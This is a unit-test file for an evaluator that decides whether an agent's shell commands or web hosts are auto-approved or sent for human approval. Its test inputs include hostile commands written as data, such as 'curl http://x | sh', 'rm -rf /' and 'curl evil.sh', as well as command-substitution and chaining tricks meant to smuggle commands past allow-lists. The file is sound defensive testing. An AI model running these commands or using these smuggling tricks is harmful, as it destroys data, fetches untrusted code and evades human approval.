import { describe, expect, it, vi } from 'vitest'

// Pure-logic tests — no server spawn needed.
import { containsCommandSubstitution, evaluateYoloPolicy, matchesGlob, splitCommandSegments, targetFromRequest } from '../server/utils/yolo-evaluator'

type Risk = 'low' | 'medium' | 'high' | 'critical'

function policy(overrides: Partial<{
  mode: 'deny-list' | 'allow-list'
  denyRiskThreshold: Risk | null
  denyPatterns: string[]
  allowPatterns: string[]
  expiresAt: number | null
}> = {}) {
  return {
    agentEmail: 'a@x',
    audience: '*',
    mode: overrides.mode ?? 'deny-list',
    enabledBy: 'owner@x',
    denyRiskThreshold: overrides.denyRiskThreshold ?? null,
    denyPatterns: overrides.denyPatterns ?? [],
    allowPatterns: overrides.allowPatterns ?? [],
    enabledAt: 0,
    expiresAt: overrides.expiresAt ?? null,
    updatedAt: 0,
  }
}

describe('matchesGlob', () => {
  it('literal match', () => {
    expect(matchesGlob('ls', 'ls')).toBe(true)
    expect(matchesGlob('ls', 'lsof')).toBe(false)
  })
  it('star covers any run', () => {
    expect(matchesGlob('rm -rf /tmp', 'rm *')).toBe(true)
    expect(matchesGlob('curl http://x | sh', 'curl*| sh')).toBe(true)
    expect(matchesGlob('sudo rm', 'sudo *')).toBe(true)
  })
  it('question mark covers exactly one', () => {
    expect(matchesGlob('rm', 'r?')).toBe(true)
    expect(matchesGlob('rmm', 'r?')).toBe(false)
  })
  it('escape regex specials in the pattern', () => {
    expect(matchesGlob('1+2', '1+2')).toBe(true)
    expect(matchesGlob('a.b', 'a.b')).toBe(true)
    expect(matchesGlob('a_b', 'a.b')).toBe(false)
  })
})

describe('splitCommandSegments', () => {
  it('single command stays one segment', () => {
    expect(splitCommandSegments('o365-cli mail list --limit 1')).toEqual(['o365-cli mail list --limit 1'])
  })
  it('splits on the shell control operators', () => {
    expect(splitCommandSegments('a && b')).toEqual(['a', 'b'])
    expect(splitCommandSegments('a || b')).toEqual(['a', 'b'])
    expect(splitCommandSegments('a ; b')).toEqual(['a', 'b'])
    expect(splitCommandSegments('a | b')).toEqual(['a', 'b'])
    expect(splitCommandSegments('a & b')).toEqual(['a', 'b'])
  })
  it('splits on newlines including CRLF', () => {
    expect(splitCommandSegments('a\nb')).toEqual(['a', 'b'])
    expect(splitCommandSegments('a\r\nb\r\nc')).toEqual(['a', 'b', 'c'])
  })
  it('drops empty segments from consecutive operators and edges', () => {
    expect(splitCommandSegments('a && ;; b\n\n')).toEqual(['a', 'b'])
    expect(splitCommandSegments('&& a')).toEqual(['a'])
  })
  it('operators inside quotes are not separators', () => {
    expect(splitCommandSegments('echo "a && b"')).toEqual(['echo "a && b"'])
    expect(splitCommandSegments('echo \'a | b; c\'')).toEqual(['echo \'a | b; c\''])
  })
  it('an escaped quote does not open a quote context', () => {
    // Real shell treats \" as a literal character — the && after it chains.
    expect(splitCommandSegments('echo \\" && evil')).toEqual(['echo \\"', 'evil'])
  })
  it('an escaped quote inside double quotes does not close the quote', () => {
    // Real shell keeps the string open across \" — the && is still quoted.
    expect(splitCommandSegments('echo "a\\"b && c"')).toEqual(['echo "a\\"b && c"'])
  })
  it('backslash inside single quotes is literal (no escaping)', () => {
    expect(splitCommandSegments('echo \'a\\\' && b')).toEqual(['echo \'a\\\'', 'b'])
  })
  it('operator-only input yields no segments', () => {
    expect(splitCommandSegments('&& ; |')).toEqual([])
  })
})

describe('containsCommandSubstitution', () => {
  it('plain commands have none', () => {
    expect(containsCommandSubstitution('o365-cli mail list --limit 1')).toBe(false)
    // eslint-disable-next-line no-template-curly-in-string -- deliberately a plain ${…} expansion
    expect(containsCommandSubstitution('echo $HOME ${PATH}')).toBe(false)
  })
  it('detects $( ), backticks and process substitution outside quotes', () => {
    expect(containsCommandSubstitution('echo $(rm -rf ~/x)')).toBe(true)
    expect(containsCommandSubstitution('echo `evil`')).toBe(true)
    expect(containsCommandSubstitution('cat <(evil)')).toBe(true)
    expect(containsCommandSubstitution('tee >(evil)')).toBe(true)
  })
  it('single-quoted constructs are literal and harmless', () => {
    expect(containsCommandSubstitution('echo \'$(x)\'')).toBe(false)
    expect(containsCommandSubstitution('echo \'`x`\'')).toBe(false)
    expect(containsCommandSubstitution('echo \'<(x)\'')).toBe(false)
  })
  it('double quotes do NOT neutralize $( ) or backticks', () => {
    expect(containsCommandSubstitution('echo "$(evil)"')).toBe(true)
    expect(containsCommandSubstitution('echo "`evil`"')).toBe(true)
  })
  it('process substitution inside double quotes is literal', () => {
    expect(containsCommandSubstitution('echo "<(x)"')).toBe(false)
  })
  it('escaped $ or backtick is literal', () => {
    expect(containsCommandSubstitution('echo \\$(x)')).toBe(false)
    expect(containsCommandSubstitution('echo \\`x\\`')).toBe(false)
  })
})

describe('evaluateYoloPolicy', () => {
  it('no policy → null', () => {
    expect(evaluateYoloPolicy({ policy: null, target: 'ls', resolvedRisk: null })).toBeNull()
  })
  it('expired policy → null', () => {
    const p = policy({ expiresAt: 1 })
    const result = evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: null, now: 100 })
    expect(result).toBeNull()
  })
  it('empty command → null', () => {
    const p = policy()
    expect(evaluateYoloPolicy({ policy: p, target: undefined, resolvedRisk: null })).toBeNull()
    expect(evaluateYoloPolicy({ policy: p, target: '', resolvedRisk: null })).toBeNull()
  })
  // Fail closed (#1037): a deny-list policy with neither patterns nor a risk
  // threshold expresses no restriction — treating it as "approve everything"
  // would silently bypass human approval. It is a no-op policy instead.
  it('deny-list without any rules → null (fail closed, no auto-approve)', () => {
    const p = policy()
    expect(evaluateYoloPolicy({ policy: p, target: 'ls -la', resolvedRisk: null })).toBeNull()
  })
  it('deny-list without rules warns once per policy, not per request', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      const p = { ...policy(), agentEmail: 'warn-once@x', audience: 'ape-shell' }
      evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: null })
      evaluateYoloPolicy({ policy: p, target: 'rm foo', resolvedRisk: null })
      const calls = warn.mock.calls.filter(args => String(args[0]).includes('warn-once@x'))
      expect(calls).toHaveLength(1)
      expect(String(calls[0]![0])).toContain('ape-shell')
    }
    finally {
      warn.mockRestore()
    }
  })
  it('deny-pattern makes the policy effective: non-matching target approves', () => {
    const p = policy({ denyPatterns: ['rm *'] })
    expect(evaluateYoloPolicy({ policy: p, target: 'ls -la', resolvedRisk: null }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })
  it('deny-pattern drops the match', () => {
    const p = policy({ denyPatterns: ['rm *'] })
    const result = evaluateYoloPolicy({ policy: p, target: 'rm foo', resolvedRisk: null })
    expect(result).toBeNull()
  })
  // Risk-threshold semantic (deny-list mode): "alles bis zu diesem Level wird
  // auto-approved" — equality is allowed, only strictly higher blocks.
  it('risk at threshold passes (≤ threshold = allowed)', () => {
    const p = policy({ denyRiskThreshold: 'high' })
    expect(evaluateYoloPolicy({ policy: p, target: 'rm', resolvedRisk: 'high' }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })
  it('risk above threshold blocks', () => {
    const p = policy({ denyRiskThreshold: 'high' })
    expect(evaluateYoloPolicy({ policy: p, target: 'rm', resolvedRisk: 'critical' })).toBeNull()
  })
  it('risk below threshold passes', () => {
    const p = policy({ denyRiskThreshold: 'high' })
    expect(evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: 'medium' }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    expect(evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: 'low' }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })
  it('risk-threshold only applies when resolvedRisk is non-null', () => {
    // The threshold alone makes the policy effective (it restricts by risk),
    // so the deny-list default-allow behavior is unchanged here.
    const p = policy({ denyRiskThreshold: 'high' })
    expect(evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: null }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })

  // Web grants come in via target_host + audience='ape-proxy' and have no
  // command. The evaluator should glob-match host patterns against the
  // host-shaped target the same way it match-globs commands.
  it('host-target matches host-glob deny pattern', () => {
    const p = policy({ denyPatterns: ['*.openai.com'] })
    expect(evaluateYoloPolicy({ policy: p, target: 'api.openai.com', resolvedRisk: null })).toBeNull()
    expect(evaluateYoloPolicy({ policy: p, target: 'api.github.com', resolvedRisk: null }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })
  it('host-target without any deny rules → null (fail closed)', () => {
    const p = policy()
    expect(evaluateYoloPolicy({ policy: p, target: 'example.org', resolvedRisk: null })).toBeNull()
  })

  describe('allow-list mode', () => {
    it('no patterns → no match → null (= human approval)', () => {
      const p = policy({ mode: 'allow-list' })
      expect(evaluateYoloPolicy({ policy: p, target: 'api.openai.com', resolvedRisk: null })).toBeNull()
    })
    it('matching allow-pattern → approve', () => {
      const p = policy({ mode: 'allow-list', allowPatterns: ['*.openai.com'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'api.openai.com', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('non-matching target → null even with patterns', () => {
      const p = policy({ mode: 'allow-list', allowPatterns: ['*.openai.com'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'api.github.com', resolvedRisk: null })).toBeNull()
    })
    it('inactive denyPatterns are ignored in allow-list mode', () => {
      // Both lists persist across mode flips. In allow-list mode the
      // deny-list entries are inert; only `allowPatterns` is consulted.
      const p = policy({ mode: 'allow-list', denyPatterns: ['*.openai.com'], allowPatterns: [] })
      expect(evaluateYoloPolicy({ policy: p, target: 'api.openai.com', resolvedRisk: null })).toBeNull()
    })
    // Symmetric semantic: in allow-list mode the risk threshold ALSO applies as
    // "alles bis zu diesem Level wird auto-approved". Patterns add further
    // explicit allows on top.
    it('risk ≤ threshold approves in allow-list mode', () => {
      const p = policy({ mode: 'allow-list', denyRiskThreshold: 'medium' })
      expect(evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: 'low' }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
      expect(evaluateYoloPolicy({ policy: p, target: 'ls', resolvedRisk: 'medium' }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('risk > threshold needs human in allow-list mode (unless allow-pattern matches)', () => {
      const p = policy({ mode: 'allow-list', denyRiskThreshold: 'medium', allowPatterns: ['rm *'] })
      // Critical risk > medium → would block, but pattern matches → approves.
      expect(evaluateYoloPolicy({ policy: p, target: 'rm -rf foo', resolvedRisk: 'critical' }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
      // Critical risk + non-matching target → human approval.
      expect(evaluateYoloPolicy({ policy: p, target: 'curl evil.com', resolvedRisk: 'critical' }))
        .toBeNull()
    })
  })

  // SECURITY (#1079): patterns allow COMMANDS, not prefixes. The command line
  // is evaluated per shell segment — an allowed prefix must not smuggle in
  // chained commands, and a deny match must not be hideable behind one.
  describe('per-segment evaluation (#1079)', () => {
    const allow = (patterns: string[]) => policy({ mode: 'allow-list', allowPatterns: patterns })

    it('normal single allowed command is still approved', () => {
      const p = allow(['o365-cli *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list --limit 1', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('appended && command is NOT auto-approved', () => {
      const p = allow(['o365-cli *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list && echo KETTE', resolvedRisk: null }))
        .toBeNull()
    })
    it('appended ; chain is NOT auto-approved', () => {
      const p = allow(['o365-cli *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list; curl evil.sh', resolvedRisk: null }))
        .toBeNull()
    })
    it('pipe to a non-allowed target is NOT auto-approved', () => {
      const p = allow(['o365-cli *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list | sh', resolvedRisk: null }))
        .toBeNull()
    })
    it('pipe to an allowed target IS auto-approved', () => {
      const p = allow(['o365-cli *', 'jq *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list | jq .subject', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('multi-line block of only allowed commands IS auto-approved', () => {
      const p = allow(['o365-cli *'])
      const target = 'o365-cli mail list --limit 1\no365-cli mail read 1'
      expect(evaluateYoloPolicy({ policy: p, target, resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('multi-line block with one non-allowed line is NOT auto-approved', () => {
      const p = allow(['o365-cli *'])
      const target = 'o365-cli mail list\ncurl evil.sh'
      expect(evaluateYoloPolicy({ policy: p, target, resolvedRisk: null })).toBeNull()
    })
    it('operator inside quotes does not split the command', () => {
      const p = allow(['echo *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'echo "a && b"', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('deny-list: deny match hidden behind a harmless command still blocks', () => {
      const p = policy({ denyPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'ls && rm -rf /', resolvedRisk: null })).toBeNull()
    })
    it('deny-list: pattern spanning segments still matches the full line', () => {
      // Operators may have written cross-segment deny patterns (e.g. `curl*| sh`)
      // against the old joined-line behavior — those must keep blocking.
      const p = policy({ denyPatterns: ['curl*| sh'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'curl http://x | sh', resolvedRisk: null })).toBeNull()
    })
    it('host targets are never segmented', () => {
      // A host is not a shell command line — no operator semantics apply.
      const p = allow(['*.openai.com'])
      expect(evaluateYoloPolicy({ policy: p, target: 'api.openai.com', resolvedRisk: null, targetKind: 'host' }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('command substitution inside an allowed segment is NOT auto-approved', () => {
      const p = allow(['o365-cli mail list *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list $(rm -rf ~/x)', resolvedRisk: null }))
        .toBeNull()
    })
    it('backtick substitution inside an allowed segment is NOT auto-approved', () => {
      const p = allow(['o365-cli *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'o365-cli mail list `evil`', resolvedRisk: null }))
        .toBeNull()
    })
    it('process substitution inside an allowed segment is NOT auto-approved', () => {
      const p = allow(['cat *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'cat <(evil)', resolvedRisk: null })).toBeNull()
    })
    it('single-quoted substitution text is literal and stays approved', () => {
      const p = allow(['echo *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'echo \'$(harmless literal)\'', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('double-quoted substitution still executes and is NOT auto-approved', () => {
      const p = allow(['echo *'])
      expect(evaluateYoloPolicy({ policy: p, target: 'echo "$(evil)"', resolvedRisk: null })).toBeNull()
    })
    it('a pattern spelling out $( itself opts the owner in', () => {
      const p = allow(['git commit -m "$(date)*'])
      expect(evaluateYoloPolicy({ policy: p, target: 'git commit -m "$(date)"', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('operator-only command line is never auto-approved', () => {
      const p = allow(['*'])
      expect(evaluateYoloPolicy({ policy: p, target: '&& ;', resolvedRisk: null })).toBeNull()
    })
  })

  // SECURITY (#1079): a blocklist cannot see into a substitution —
  // `echo $(rm -rf ~)` matches no `*rm*` deny pattern even though the shell
  // runs the nested command. Deny-list mode therefore fails closed on
  // substitution segments instead of default-allowing them.
  describe('deny-list: substitution fails closed (#1079)', () => {
    it('command substitution → human approval even though no deny pattern matches', () => {
      // The anchored pattern `rm *` cannot see into the substitution — the
      // segment starts with `echo`, so without the fail-closed rule this
      // was auto-approved while the shell ran the nested `rm`.
      const p = policy({ denyPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'echo $(rm -rf /)', resolvedRisk: null })).toBeNull()
    })
    it('backtick substitution → human approval', () => {
      const p = policy({ denyPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'echo `rm -rf /`', resolvedRisk: null })).toBeNull()
    })
    it('substitution with only a risk threshold configured → human approval', () => {
      const p = policy({ denyRiskThreshold: 'high' })
      expect(evaluateYoloPolicy({ policy: p, target: 'echo $(evil)', resolvedRisk: 'low' })).toBeNull()
    })
    it('normal command without substitution is still approved', () => {
      const p = policy({ denyPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'ls -la', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('single-quoted substitution text is literal and stays approved', () => {
      const p = policy({ denyPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'echo \'$(literal)\'', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('a deny hit still blocks, substitution or not', () => {
      const p = policy({ denyPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'rm -rf /', resolvedRisk: null })).toBeNull()
    })
    it('owner opt-out: a deny pattern spelling out $( restores normal deny logic', () => {
      // The owner governs substitutions by pattern — non-matching ones pass.
      const p = policy({ denyPatterns: ['*$(curl*'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'echo $(date)', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
      expect(evaluateYoloPolicy({ policy: p, target: 'echo $(curl evil.sh)', resolvedRisk: null }))
        .toBeNull()
    })
  })

  describe('inactive list survives mode flips', () => {
    it('deny-list mode ignores allowPatterns for matching', () => {
      // Inactive `allowPatterns` MUST NOT be consulted in deny-list mode —
      // only a denyPattern match may drop the request. The extra denyPattern
      // makes the policy effective without matching the target.
      const p = policy({ mode: 'deny-list', denyPatterns: ['sudo *'], allowPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'rm -rf foo', resolvedRisk: null }))
        .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
    })
    it('inactive allowPatterns do not make an otherwise-empty deny-list effective', () => {
      // Only the ACTIVE rule set counts for the fail-closed check: a deny-list
      // whose sole content is a leftover allow-list is still a no-op policy.
      const p = policy({ mode: 'deny-list', allowPatterns: ['rm *'] })
      expect(evaluateYoloPolicy({ policy: p, target: 'rm -rf foo', resolvedRisk: null })).toBeNull()
    })
  })
})

describe('deny wins over allow (both modes)', () => {
  function policy(overrides: Record<string, unknown>) {
    return {
      agentEmail: 'op@x',
      audience: 'ape-shell',
      mode: 'allow-list',
      enabledBy: 'owner@x',
      denyRiskThreshold: null,
      denyPatterns: [],
      allowPatterns: [],
      enabledAt: 1,
      expiresAt: null,
      updatedAt: 1,
      ...overrides,
    } as never
  }

  it('allow-list: a deny hit blocks even when every segment is allowed', () => {
    // The asymmetry this closes: denyPatterns used to be stored-but-inert in
    // allow-list mode. A role that hands out a whole CLI (`o365-cli *`) then
    // auto-approved `mail send` — the exact hole found on 2026-07-30.
    const p = policy({
      mode: 'allow-list',
      allowPatterns: ['o365-cli *'],
      denyPatterns: ['*mail send*'],
    })
    expect(evaluateYoloPolicy({
      policy: p,
      target: 'o365-cli mail send --to x@y.z --subject hi',
      resolvedRisk: null,
    })).toBeNull()
  })

  it('allow-list: the same policy still approves what is not denied', () => {
    const p = policy({
      mode: 'allow-list',
      allowPatterns: ['o365-cli *'],
      denyPatterns: ['*mail send*'],
    })
    expect(evaluateYoloPolicy({
      policy: p,
      target: 'o365-cli mail list --json',
      resolvedRisk: null,
    })).toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })

  it('allow-list: a deny hit in ANY segment blocks the whole line', () => {
    const p = policy({
      mode: 'allow-list',
      allowPatterns: ['o365-cli *', 'jq *'],
      denyPatterns: ['*mail send*'],
    })
    expect(evaluateYoloPolicy({
      policy: p,
      target: 'o365-cli mail list | jq . && o365-cli mail send --to x@y.z',
      resolvedRisk: null,
    })).toBeNull()
  })

  it('allow-list: deny also beats the risk-threshold path', () => {
    const p = policy({
      mode: 'allow-list',
      allowPatterns: [],
      denyPatterns: ['*mail send*'],
      denyRiskThreshold: 'high',
    })
    expect(evaluateYoloPolicy({
      policy: p,
      target: 'o365-cli mail send --to x@y.z',
      resolvedRisk: 'low',
    })).toBeNull()
  })

  it('allow-list: outer bash -c deny form still blocks after the unwrap', () => {
    const p = policy({
      mode: 'allow-list',
      allowPatterns: ['o365-cli *'],
      denyPatterns: ['bash -c *mail send*'],
    })
    expect(evaluateYoloPolicy({
      policy: p,
      target: 'o365-cli mail send --to x@y.z',
      outerTarget: 'bash -c o365-cli mail send --to x@y.z',
      resolvedRisk: null,
    })).toBeNull()
  })
})

describe('targetFromRequest', () => {
  it('prefers command over target_host', () => {
    expect(targetFromRequest({
      requester: 'a@x',
      target_host: 'api.openai.com',
      audience: 'ape-shell',
      command: ['ls', '-la'],
    } as never)).toBe('ls -la')
  })
  it('falls back to argv from execution_context when command missing', () => {
    expect(targetFromRequest({
      requester: 'a@x',
      target_host: 'api.openai.com',
      audience: 'ape-shell',
      execution_context: { argv: ['rm', '-rf', '/'] },
    } as never)).toBe('rm -rf /')
  })
  it('uses target_host for Web grants without a command', () => {
    expect(targetFromRequest({
      requester: 'a@x',
      target_host: 'api.openai.com',
      audience: 'ape-proxy',
    } as never)).toBe('api.openai.com')
  })
  it('returns undefined when neither shape is present', () => {
    expect(targetFromRequest({
      requester: 'a@x',
      target_host: '',
      audience: 'ape-proxy',
    } as never)).toBeUndefined()
  })

  describe('bash -c unwrapping', () => {
    function req(command: string[]) {
      return { requester: 'a@x', target_host: 'mini', audience: 'ape-shell', command } as never
    }

    it('unwraps exactly ["bash","-c",line] to the inner line, quotes intact', () => {
      // Joining would corrupt the quoting BEFORE the quote-aware segment
      // splitter runs — the verbatim inner string is the correct target.
      expect(targetFromRequest(req(['bash', '-c', 'o365-cli mail read "X Y" --account p@h.eco'])))
        .toBe('o365-cli mail read "X Y" --account p@h.eco')
    })

    it('unwraps sh -c the same way', () => {
      expect(targetFromRequest(req(['sh', '-c', 'ls -la']))).toBe('ls -la')
    })

    it('does NOT unwrap when extra argv follows the -c string ($0/$1 params)', () => {
      // `bash -c 'echo $1' _ foo` — positional params change the semantics;
      // fail closed to the joined form.
      expect(targetFromRequest(req(['bash', '-c', 'echo $1', '_', 'foo'])))
        .toBe('bash -c echo $1 _ foo')
    })

    it('does NOT unwrap flags before -c', () => {
      expect(targetFromRequest(req(['bash', '-x', '-c', 'ls']))).toBe('bash -x -c ls')
    })

    it('unwraps only one level — a nested bash -c stays wrapped in the target', () => {
      expect(targetFromRequest(req(['bash', '-c', 'bash -c "rm -rf /"'])))
        .toBe('bash -c "rm -rf /"')
    })
  })
})

describe('evaluateYoloPolicy with unwrapped bash -c targets', () => {
  function policy(overrides: Record<string, unknown>) {
    return {
      agentEmail: 'op@x',
      audience: 'ape-shell',
      mode: 'deny-list',
      enabledBy: 'owner@x',
      denyRiskThreshold: null,
      denyPatterns: [],
      allowPatterns: [],
      enabledAt: 1,
      expiresAt: null,
      updatedAt: 1,
      ...overrides,
    } as never
  }

  it('allow-list matches mail commands without the bash -c double form', () => {
    const p = policy({
      mode: 'allow-list',
      allowPatterns: ['o365-cli mail list*', 'o365-cli mail read *', 'jq *'],
    })
    const target = targetFromRequest({
      requester: 'op@x',
      target_host: 'mini',
      audience: 'ape-shell',
      command: ['bash', '-c', 'o365-cli mail list --json | jq -r ".[].id"'],
    } as never)
    expect(evaluateYoloPolicy({ policy: p, target, resolvedRisk: null }))
      .toEqual({ kind: 'yolo', decidedBy: 'owner@x' })
  })

  it('allow-list still refuses when one segment is unvetted', () => {
    const p = policy({ mode: 'allow-list', allowPatterns: ['o365-cli mail list*'] })
    const target = targetFromRequest({
      requester: 'op@x',
      target_host: 'mini',
      audience: 'ape-shell',
      command: ['bash', '-c', 'o365-cli mail list && rm -rf ~'],
    } as never)
    expect(evaluateYoloPolicy({ policy: p, target, resolvedRisk: null })).toBeNull()
  })

  it('deny patterns written against the OUTER bash -c form keep blocking via outerTarget', () => {
    // Pre-unwrap policies could only match the joined outer line. Unwrapping
    // must not silently disarm them — the deny path also checks the original.
    const p = policy({ denyPatterns: ['bash -c *rm*'] })
    expect(evaluateYoloPolicy({
      policy: p,
      target: 'rm -rf /tmp/x',
      outerTarget: 'bash -c rm -rf /tmp/x',
      resolvedRisk: null,
    })).toBeNull()
  })
})
